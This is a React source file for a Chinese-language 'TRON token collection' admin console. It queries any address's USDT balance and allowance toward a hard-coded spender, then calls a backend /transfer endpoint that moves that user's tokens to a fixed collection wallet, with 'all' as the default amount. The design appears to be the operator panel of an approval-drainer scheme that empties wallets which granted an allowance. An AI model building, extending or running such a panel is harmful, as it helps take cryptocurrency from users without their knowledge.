import React, { useState, useEffect } from 'react';
import { 
  Server, 
  Activity, 
  Wallet, 
  Send, 
  RefreshCw, 
  CheckCircle, 
  AlertCircle, 
  ArrowRight, 
  Search, 
  Layers, 
  ShieldCheck, 
  Key, 
  Terminal, 
  Copy, 
  ExternalLink 
} from 'lucide-react';
import { Language } from '../types';

interface AdminDashboardProps {
  language: Language;
}

interface SystemHealth {
  status: string;
  configured: boolean;
  network: string;
  spender: string;
  to: string;
  tokenContract: string;
  message?: string;
}

interface OpLog {
  id: string;
  timestamp: string;
  type: 'balance' | 'allowance' | 'transfer' | 'health';
  status: 'success' | 'error' | 'pending';
  details: string;
  txid?: string;
}

export const AdminDashboard: React.FC<AdminDashboardProps> = ({ language }) => {
  // Server Health State
  const [health, setHealth] = useState<SystemHealth | null>(null);
  const [healthLoading, setHealthLoading] = useState<boolean>(false);

  // Address Query State
  const [queryAddress, setQueryAddress] = useState<string>('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [querySpender, setQuerySpender] = useState<string>('TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT');
  const [balanceResult, setBalanceResult] = useState<string | null>(null);
  const [allowanceResult, setAllowanceResult] = useState<string | null>(null);
  const [isQuerying, setIsQuerying] = useState<boolean>(false);

  // Transfer Action State
  const [transferUserAddress, setTransferUserAddress] = useState<string>('');
  const [transferAmount, setTransferAmount] = useState<string>('all');
  const [isExecutingTransfer, setIsExecutingTransfer] = useState<boolean>(false);
  const [transferResponse, setTransferResponse] = useState<any | null>(null);

  // Operation Logs
  const [logs, setLogs] = useState<OpLog[]>([]);

  const addLog = (type: OpLog['type'], status: OpLog['status'], details: string, txid?: string) => {
    const newLog: OpLog = {
      id: Date.now().toString(),
      timestamp: new Date().toLocaleTimeString(),
      type,
      status,
      details,
      txid
    };
    setLogs((prev) => [newLog, ...prev.slice(0, 49)]);
  };

  // Fetch Health Check
  const fetchHealth = async () => {
    setHealthLoading(true);
    try {
      const res = await fetch('/health');
      if (!res.ok) throw new Error(`HTTP error ${res.status}`);
      const data: SystemHealth = await res.json();
      setHealth(data);
      if (data.spender) setQuerySpender(data.spender);
      addLog('health', 'success', `服务状态正常: ${data.network}`);
    } catch (err: any) {
      console.error('Health check failed:', err);
      setHealth({
        status: 'error',
        configured: false,
        network: '未连接',
        spender: '未配置',
        to: '未配置',
        tokenContract: '未配置',
        message: err.message || '服务端未响应'
      });
      addLog('health', 'error', `健康检查失败: ${err.message}`);
    } finally {
      setHealthLoading(false);
    }
  };

  useEffect(() => {
    fetchHealth();
  }, []);

  // Query Balance & Allowance
  const handleQueryAddressInfo = async () => {
    if (!queryAddress.trim()) return;
    setIsQuerying(true);
    setBalanceResult(null);
    setAllowanceResult(null);

    try {
      // 1. Query Balance
      const balRes = await fetch(`/balance/${queryAddress.trim()}`);
      const balData = await balRes.json();
      if (balRes.ok) {
        setBalanceResult(balData.balance);
        addLog('balance', 'success', `查询余额成功 [${queryAddress.slice(0, 8)}...]: ${balData.balance}`);
      } else {
        setBalanceResult(`错误: ${balData.error || '查询失败'}`);
        addLog('balance', 'error', `查询余额失败: ${balData.error}`);
      }

      // 2. Query Allowance if spender address provided
      const targetSpender = querySpender || health?.spender || 'TPNAAgFU4Ju7qnfHWJGBnJj6LGYBqw9SWT';
      if (targetSpender && targetSpender !== '未配置') {
        const allowRes = await fetch(`/allowance/${queryAddress.trim()}/${targetSpender}`);
        const allowData = await allowRes.json();
        if (allowRes.ok) {
          setAllowanceResult(allowData.allowance);
          addLog('allowance', 'success', `查询 Allowance 成功 [Spender: ${targetSpender.slice(0, 6)}...]: ${allowData.allowance}`);
        } else {
          setAllowanceResult(`错误: ${allowData.error || '查询失败'}`);
          addLog('allowance', 'error', `查询 Allowance 失败: ${allowData.error}`);
        }
      }
    } catch (err: any) {
      addLog('balance', 'error', `请求失败: ${err.message}`);
    } finally {
      setIsQuerying(false);
    }
  };

  // Execute TransferFrom
  const handleExecuteTransfer = async () => {
    if (!transferUserAddress.trim()) {
      alert('请填写目标用户地址');
      return;
    }
    setIsExecutingTransfer(true);
    setTransferResponse(null);

    try {
      const res = await fetch('/transfer', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          userAddress: transferUserAddress.trim(),
          amount: transferAmount || 'all'
        })
      });
      const data = await res.json();
      setTransferResponse(data);
      if (res.ok && data.success) {
        addLog('transfer', 'success', `提取成功! 数量: ${data.amount}, 到账地址: ${data.to}`, data.txid);
      } else {
        addLog('transfer', 'error', `提取失败: ${data.error || data.message || '未知错误'}`);
      }
    } catch (err: any) {
      setTransferResponse({ error: err.message });
      addLog('transfer', 'error', `调用 /transfer 异常: ${err.message}`);
    } finally {
      setIsExecutingTransfer(false);
    }
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  return (
    <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8 animate-in fade-in duration-200">
      {/* Header Banner */}
      <div className="bg-slate-900 text-white rounded-3xl p-6 sm:p-8 shadow-xl relative overflow-hidden">
        <div className="absolute right-0 top-0 bottom-0 w-1/3 bg-gradient-to-l from-blue-600/20 to-transparent pointer-events-none" />
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 relative z-10">
          <div>
            <div className="flex items-center space-x-3 mb-2">
              <span className="bg-blue-500/20 text-blue-400 border border-blue-500/30 text-xs font-semibold px-3 py-1 rounded-full flex items-center space-x-1">
                <Terminal className="w-3.5 h-3.5" />
                <span>Backend Management Console</span>
              </span>
              <span className="bg-emerald-500/20 text-emerald-400 text-xs font-semibold px-2.5 py-1 rounded-full flex items-center space-x-1">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                <span>API Server V1.0</span>
              </span>
            </div>
            <h1 className="text-2xl sm:text-3xl font-bold tracking-tight">TRON 代币与归集管理后台</h1>
            <p className="text-slate-400 text-sm mt-1 max-w-2xl">
              实时监控后端节点连接、查询指定账户余额与 Allowance 额度，支持依据 server.js 规则执行 safe transferFrom 归集打款。
            </p>
          </div>

          <button
            onClick={fetchHealth}
            disabled={healthLoading}
            className="bg-blue-600 hover:bg-blue-500 text-white font-semibold px-4 py-2.5 rounded-xl text-sm flex items-center space-x-2 transition shadow-md disabled:opacity-50"
          >
            <RefreshCw className={`w-4 h-4 ${healthLoading ? 'animate-spin' : ''}`} />
            <span>刷新服务状态</span>
          </button>
        </div>
      </div>

      {/* Grid: Server Config Overview */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
        {/* Network Node Card */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">网络节点 (Full Node)</span>
            <Server className="w-4 h-4 text-blue-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate">
            {health?.network || 'https://api.trongrid.io'}
          </div>
          <div className="text-xs text-slate-500 flex items-center space-x-1">
            <span className="w-2 h-2 rounded-full bg-emerald-500 inline-block" />
            <span>TRON 主网</span>
          </div>
        </div>

        {/* Token Contract Card */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">代币合约 (TRC20)</span>
            <Layers className="w-4 h-4 text-indigo-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{health?.tokenContract || 'TR7NHqjeKQxGTCi8q...'}</span>
            {health?.tokenContract && (
              <button 
                onClick={() => copyToClipboard(health.tokenContract)}
                className="text-slate-400 hover:text-slate-600 p-1"
                title="复制"
              >
                <Copy className="w-3.5 h-3.5" />
              </button>
            )}
          </div>
          <div className="text-xs text-slate-500 font-medium">USDT / TRC20 Token</div>
        </div>

        {/* Spender Address Card */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">Spender 合约</span>
            <ShieldCheck className="w-4 h-4 text-amber-500" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{health?.spender || 'TPNAAgFU4Ju7qnf...'}</span>
            {health?.spender && (
              <button 
                onClick={() => copyToClipboard(health.spender)}
                className="text-slate-400 hover:text-slate-600 p-1"
                title="复制"
              >
                <Copy className="w-3.5 h-3.5" />
              </button>
            )}
          </div>
          <div className="text-xs text-amber-600 bg-amber-50 px-2 py-0.5 rounded font-mono inline-block">
            Allowance 目标
          </div>
        </div>

        {/* Target Collection Address Card */}
        <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-2xs space-y-2">
          <div className="flex items-center justify-between text-slate-500">
            <span className="text-xs font-medium uppercase tracking-wider">归集收款目标 (To Address)</span>
            <Wallet className="w-4 h-4 text-emerald-600" />
          </div>
          <div className="text-sm font-bold text-slate-900 truncate flex items-center justify-between">
            <span className="truncate">{health?.to || 'TUc1cb2gyX8MVPk...'}</span>
            {health?.to && (
              <button 
                onClick={() => copyToClipboard(health.to)}
                className="text-slate-400 hover:text-slate-600 p-1"
                title="复制"
              >
                <Copy className="w-3.5 h-3.5" />
              </button>
            )}
          </div>
          <div className="text-xs text-emerald-600 bg-emerald-50 px-2 py-0.5 rounded font-mono inline-block">
            资金入账地址
          </div>
        </div>
      </div>

      {/* Main Control Panel: Query & Action */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
        {/* Module 1: Query Address Balance & Allowance */}
        <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
            <div className="w-10 h-10 rounded-2xl bg-blue-50 text-blue-600 flex items-center justify-center font-bold">
              <Search className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">1. 用户 Allowance 与余额查询</h2>
              <p className="text-xs text-slate-500">查询特定 TRON 地址的代币余额与对平台 Spender 的 Allowance 额度</p>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                目标用户 TRON 地址 (userAddress)
              </label>
              <input
                type="text"
                value={queryAddress}
                onChange={(e) => setQueryAddress(e.target.value)}
                placeholder="以 T 开头的 TRON 34位地址..."
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-100 outline-none"
              />
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                Spender 合约地址 (Spender Address)
              </label>
              <input
                type="text"
                value={querySpender}
                onChange={(e) => setQuerySpender(e.target.value)}
                placeholder="默认为 server.ts 配置的 SPENDER_ADDRESS"
                className="w-full px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-blue-500 focus:ring-2 focus:ring-blue-100 outline-none"
              />
            </div>

            <button
              onClick={handleQueryAddressInfo}
              disabled={isQuerying || !queryAddress}
              className="w-full bg-slate-900 hover:bg-slate-800 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition disabled:opacity-50"
            >
              <Search className={`w-4 h-4 ${isQuerying ? 'animate-spin' : ''}`} />
              <span>{isQuerying ? '正在查询区块链数据...' : '执行后端查询 (balance / allowance)'}</span>
            </button>

            {/* Results Display */}
            {(balanceResult !== null || allowanceResult !== null) && (
              <div className="bg-slate-50 rounded-2xl p-4 border border-slate-200 space-y-3 font-mono text-xs">
                <div className="flex items-center justify-between pb-2 border-b border-slate-200">
                  <span className="text-slate-500 font-sans font-medium">代币余额 (balanceOf):</span>
                  <span className="font-bold text-slate-900 text-sm">{balanceResult ?? '未查询'}</span>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-slate-500 font-sans font-medium">Allowance 额度:</span>
                  <span className="font-bold text-emerald-600 text-sm">{allowanceResult ?? '未查询'}</span>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Module 2: Execute TransferFrom Collection */}
        <div className="bg-white rounded-3xl p-6 border border-slate-200 shadow-sm space-y-6">
          <div className="flex items-center space-x-3 border-b border-slate-100 pb-4">
            <div className="w-10 h-10 rounded-2xl bg-emerald-50 text-emerald-600 flex items-center justify-center font-bold">
              <Send className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-lg font-bold text-slate-900">2. 执行 transferFrom 划转打款</h2>
              <p className="text-xs text-slate-500">调用后端 POST /transfer 接口，将特定用户的代币划转至归集地址</p>
            </div>
          </div>

          <div className="space-y-4">
            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                目标用户地址 (userAddress)
              </label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={transferUserAddress}
                  onChange={(e) => setTransferUserAddress(e.target.value)}
                  placeholder="用户 TRON 钱包地址..."
                  className="flex-1 px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none"
                />
                {queryAddress && (
                  <button
                    onClick={() => setTransferUserAddress(queryAddress)}
                    className="px-3 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl text-xs font-medium whitespace-nowrap"
                  >
                    同步上图地址
                  </button>
                )}
              </div>
            </div>

            <div>
              <label className="block text-xs font-bold text-slate-700 uppercase mb-1">
                划转数量 (amount)
              </label>
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={transferAmount}
                  onChange={(e) => setTransferAmount(e.target.value)}
                  placeholder="'all' 或具体最小单位数值 (如 1000000 代表 1 USDT)"
                  className="flex-1 px-4 py-2.5 bg-slate-50 border border-slate-200 rounded-xl text-sm font-mono focus:bg-white focus:border-emerald-500 focus:ring-2 focus:ring-emerald-100 outline-none"
                />
                <button
                  onClick={() => setTransferAmount('all')}
                  className="px-4 py-2 bg-emerald-50 text-emerald-700 hover:bg-emerald-100 border border-emerald-200 rounded-xl text-xs font-bold"
                >
                  全部划转 (all)
                </button>
              </div>
            </div>

            <button
              onClick={handleExecuteTransfer}
              disabled={isExecutingTransfer || !transferUserAddress}
              className="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-semibold py-3 rounded-xl text-sm flex items-center justify-center space-x-2 transition shadow-md disabled:opacity-50 cursor-pointer"
            >
              <Send className={`w-4 h-4 ${isExecutingTransfer ? 'animate-bounce' : ''}`} />
              <span>{isExecutingTransfer ? '正在发送链上交易...' : '提交划转请求 (POST /transfer)'}</span>
            </button>

            {/* Transfer Response Output */}
            {transferResponse && (
              <div className={`rounded-2xl p-4 border text-xs font-mono space-y-2 ${
                transferResponse.success 
                  ? 'bg-emerald-50/70 border-emerald-200 text-emerald-900' 
                  : 'bg-rose-50/70 border-rose-200 text-rose-900'
              }`}>
                <div className="flex items-center space-x-2 font-sans font-bold">
                  {transferResponse.success ? (
                    <>
                      <CheckCircle className="w-4 h-4 text-emerald-600" />
                      <span>{transferResponse.message || '划转操作成功'}</span>
                    </>
                  ) : (
                    <>
                      <AlertCircle className="w-4 h-4 text-rose-600" />
                      <span>划转响应结果</span>
                    </>
                  )}
                </div>

                {transferResponse.txid && (
                  <div className="space-y-1 pt-1">
                    <span className="text-slate-500 font-sans block text-[11px]">交易 Hash (TxID):</span>
                    <div className="flex items-center justify-between bg-white/80 p-2 rounded-lg border border-slate-200">
                      <span className="truncate">{transferResponse.txid}</span>
                      <button 
                        onClick={() => copyToClipboard(transferResponse.txid)}
                        className="text-slate-500 hover:text-slate-800 ml-2"
                        title="复制 TxID"
                      >
                        <Copy className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                )}

                {transferResponse.error && (
                  <p className="text-rose-700 font-medium">错误信息: {transferResponse.error}</p>
                )}
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Module 3: Operation Terminal Logs & Server Workflow */}
      <div className="bg-slate-950 text-slate-200 rounded-3xl p-6 border border-slate-800 shadow-2xl space-y-4">
        <div className="flex items-center justify-between border-b border-slate-800 pb-3">
          <div className="flex items-center space-x-2">
            <Terminal className="w-5 h-5 text-emerald-400" />
            <h3 className="font-bold text-sm text-white font-mono">Backend Console Log & API Workflow</h3>
          </div>
          <button
            onClick={() => setLogs([])}
            className="text-xs text-slate-500 hover:text-slate-300 font-mono"
          >
            清空日志
          </button>
        </div>

        <div className="font-mono text-xs space-y-2 max-h-60 overflow-y-auto pr-2 custom-scrollbar">
          {logs.length === 0 ? (
            <p className="text-slate-600 italic">暂无新的后台操作记录...</p>
          ) : (
            logs.map((log) => (
              <div key={log.id} className="flex items-start space-x-2 text-slate-300 hover:bg-slate-900/50 p-1.5 rounded transition">
                <span className="text-slate-500 text-[10px] whitespace-nowrap font-mono">{log.timestamp}</span>
                <span className={`px-1.5 py-0.5 rounded text-[10px] uppercase font-bold ${
                  log.status === 'success' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'
                }`}>
                  [{log.type}]
                </span>
                <span className="flex-1 break-all">{log.details}</span>
                {log.txid && (
                  <span className="text-blue-400 text-[10px] font-mono shrink-0">
                    Tx: {log.txid.slice(0, 8)}...
                  </span>
                )}
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
};
